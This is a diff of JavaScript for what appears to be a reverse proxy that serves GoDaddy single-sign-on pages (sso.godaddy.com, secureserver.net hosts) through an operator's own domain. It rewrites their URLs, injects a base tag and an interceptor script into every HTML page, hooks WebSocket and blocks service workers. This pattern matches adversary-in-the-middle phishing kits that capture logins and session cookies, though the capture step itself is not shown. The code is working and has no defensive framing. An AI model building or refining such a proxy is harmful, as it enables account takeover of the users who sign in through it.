@@ -135,90 +135,6 @@ function shouldProxyDomain(hostname) {
   return false;
 }
 
-function rewriteUrl(url, upstreamDomain) {
-  try {
-    // Handle absolute URLs
-    if (url.startsWith('http://') || url.startsWith('https://')) {
-      const urlObj = new URL(url);
-      if (shouldProxyDomain(urlObj.hostname) && !urlObj.hostname.includes(YOUR_DOMAIN)) {
-        return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${urlObj.hostname}${urlObj.pathname}${urlObj.search}`;
-      }
-      return url;
-    }
-    
-    // Handle protocol-relative URLs
-    if (url.startsWith('//')) {
-      const hostname = url.split('/')[2];
-      if (shouldProxyDomain(hostname)) {
-        return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${hostname}${url.substring(2 + hostname.length)}`;
-      }
-      return 'https:' + url;
-    }
-    
-    // Handle relative URLs - THIS WAS MISSING
-    if (url.startsWith('/') && upstreamDomain) {
-      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${url}`;
-    }
-    
-    return url;
-  } catch (e) {
-    return url;
-  }
-}
-
-function rewriteUrls(text, upstreamDomain) {
-  let result = text;
-  
-  // Replace localhost references
-  result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
-  result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
-  
-  // Replace all known identity provider domains
-  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
-    const escaped = domain.replace(/\./g, '\\.');
-    
-    // Full URLs
-    result = result.replace(
-      new RegExp(`https://${escaped}(?!\\w)`, 'g'),
-      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
-    );
-    result = result.replace(
-      new RegExp(`http://${escaped}(?!\\w)`, 'g'),
-      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
-    );
-    // Protocol-relative
-    result = result.replace(
-      new RegExp(`//${escaped}(?!\\w)`, 'g'),
-      `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
-    );
-  });
-  
-  // Fix relative paths for current upstream - convert to absolute proxy URLs
-  // Match href="/path" or src="/path" or url(/path)
-  result = result.replace(
-    /((?:href|src|action)=["'])\/([^"']*)/g,
-    `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
-  );
-  
-  // Fix CSS url(/path)
-  result = result.replace(
-    /url\(["']?\/([^"')]+)["']?\)/g,
-    `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1)`
-  );
-  
-  // Fix JS references to window.location
-  result = result.replace(
-    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
-    `window.location.hostname = "${YOUR_DOMAIN}"`
-  );
-  result = result.replace(
-    /document\.domain\s*=\s*["'][^"']+["']/g,
-    `document.domain = "${YOUR_DOMAIN}"`
-  );
-  
-  return result;
-}
-
 function rewriteLocation(location) {
   try {
     const url = new URL(location);
@@ -283,12 +199,15 @@ function generateInterceptorScript(upstreamDomain) {
   }
   
   function rewriteUrl(url) {
-    if (!url) return url;
+    if (!url || typeof url !== 'string') return url;
     try {
-      // Absolute URLs
+      // Already proxied
+      if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;
+      
+      // Absolute URLs with domains to proxy
       if (url.startsWith('http')) {
         const urlObj = new URL(url);
-        if (shouldProxyDomain(urlObj.hostname) && !urlObj.hostname.includes(YOUR_DOMAIN)) {
+        if (shouldProxyDomain(urlObj.hostname)) {
           return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
         }
         return url;
@@ -303,20 +222,11 @@ function generateInterceptorScript(upstreamDomain) {
         return 'https:' + url;
       }
       
-      // Relative URLs - CRITICAL FIX
+      // Relative URLs starting with /
       if (url.startsWith('/')) {
         return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
       }
       
-      // Relative without slash (e.g., "api/endpoint")
-      if (!url.startsWith('http') && !url.startsWith('#') && !url.startsWith('data:')) {
-        // Check if it's a relative path that needs proxying
-        const currentPath = window.location.pathname;
-        if (currentPath.includes(PROXY_PREFIX)) {
-          // We're already in a proxied context, keep it relative to current proxy
-          return url;
-        }
-      }
     } catch(e) {}
     return url;
   }
@@ -349,75 +259,46 @@ function generateInterceptorScript(upstreamDomain) {
     return new originalWebSocket(newUrl, protocols);
   };
   
-  // Override location.assign and replace properly (fixing read-only error)
-  try {
-    const originalAssign = window.location.assign.bind(window.location);
-    Object.defineProperty(window.location, 'assign', {
-      value: function(url) {
-        return originalAssign(rewriteUrl(url));
-      },
-      writable: true,
-      configurable: true
-    });
-    
-    const originalReplace = window.location.replace.bind(window.location);
-    Object.defineProperty(window.location, 'replace', {
-      value: function(url) {
-        return originalReplace(rewriteUrl(url));
-      },
-      writable: true,
-      configurable: true
-    });
-    
-    // Also override href setter
-    const originalHref = Object.getOwnPropertyDescriptor(window.location, 'href');
-    if (originalHref) {
-      Object.defineProperty(window.location, 'href', {
-        get: originalHref.get,
-        set: function(url) {
-          return originalHref.set.call(this, rewriteUrl(url));
-        },
-        configurable: true
+  // Block Service Worker registration to prevent caching issues
+  if ('serviceWorker' in navigator) {
+    const originalRegister = navigator.serviceWorker.register;
+    navigator.serviceWorker.register = function(scriptURL, options) {
+      console.log('[Proxy] Blocking service worker registration:', scriptURL);
+      return Promise.reject(new Error('Service workers disabled in proxy mode'));
+    };
+  }
+  
+  // Monitor DOM changes to rewrite dynamically added elements
+  const observer = new MutationObserver(function(mutations) {
+    mutations.forEach(function(mutation) {
+      mutation.addedNodes.forEach(function(node) {
+        if (node.nodeType === 1) { // Element node
+          // Rewrite src/href attributes
+          if (node.src && node.src.startsWith('/') && !node.src.includes(PROXY_PREFIX)) {
+            node.src = rewriteUrl(node.src);
+          }
+          if (node.href && node.href.startsWith('/') && !node.href.includes(PROXY_PREFIX)) {
+            node.href = rewriteUrl(node.href);
+          }
+          // Check children
+          node.querySelectorAll && node.querySelectorAll('[src],[href]').forEach(function(el) {
+            if (el.src && el.src.startsWith('/') && !el.src.includes(PROXY_PREFIX)) {
+              el.src = rewriteUrl(el.src);
+            }
+            if (el.href && el.href.startsWith('/') && !el.href.includes(PROXY_PREFIX)) {
+              el.href = rewriteUrl(el.href);
+            }
+          });
+        }
       });
-    }
-  } catch(e) {
-    console.log('[Proxy] Could not override location methods:', e);
-  }
-  
-  // Intercept form submissions
-  document.addEventListener('submit', function(e) {
-    const form = e.target;
-    if (form.action && form.action.startsWith('http')) {
-      const newAction = rewriteUrl(form.action);
-      if (newAction !== form.action) {
-        form.action = newAction;
-      }
-    }
-  }, true);
-  
-  // Fix all existing links and forms on load
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', fixExistingElements);
-  } else {
-    fixExistingElements();
-  }
-  
-  function fixExistingElements() {
-    // Fix all links
-    document.querySelectorAll('a[href]').forEach(el => {
-      const href = el.getAttribute('href');
-      if (href && (href.startsWith('/') || shouldProxyDomain(href))) {
-        el.href = rewriteUrl(href);
-      }
     });
-    
-    // Fix all images and scripts
-    document.querySelectorAll('img[src], script[src], link[href]').forEach(el => {
-      const attr = el.src ? 'src' : 'href';
-      const val = el.getAttribute(attr);
-      if (val && val.startsWith('/')) {
-        el.setAttribute(attr, rewriteUrl(val));
-      }
+  });
+  
+  if (document.body) {
+    observer.observe(document.body, { childList: true, subtree: true });
+  } else {
+    document.addEventListener('DOMContentLoaded', function() {
+      observer.observe(document.body, { childList: true, subtree: true });
     });
   }
   
@@ -573,21 +454,26 @@ export default async function handleRequest(request) {
     if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
       let text = await resp.text();
       
-      // Rewrite all URLs including relative ones
-      text = rewriteUrls(text, upstreamDomain);
-      
-      // Inject interceptor script into HTML
+      // Inject base tag and interceptor at the very beginning of HTML
       if (ct.includes('text/html')) {
+        const baseTag = `<base href="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/">`;
         const interceptor = generateInterceptorScript(upstreamDomain);
-        // Insert as early as possible
+        
+        // Insert base tag and script as early as possible
         if (text.includes('<head>')) {
-          text = text.replace('<head>', '<head>' + interceptor);
+          text = text.replace('<head>', `<head>${baseTag}${interceptor}`);
         } else if (text.includes('<html>')) {
-          text = text.replace('<html>', '<html>' + interceptor);
+          text = text.replace('<html>', `<html>${baseTag}${interceptor}`);
         } else {
-          text = interceptor + text;
+          text = baseTag + interceptor + text;
         }
       }
+      
+      // Rewrite absolute URLs in CSS/JS
+      text = text.replace(
+        new RegExp(`https://(sso\\.godaddy\\.com|sso\\.secureserver\\.net|csp\\.secureserver\\.net|www\\.godaddy\\.com)`, 'g'),
+        `https://${YOUR_DOMAIN}${PROXY_PREFIX}$1`
+      );
       
       return new Response(text, { status: resp.status, headers: newHeaders });
     }
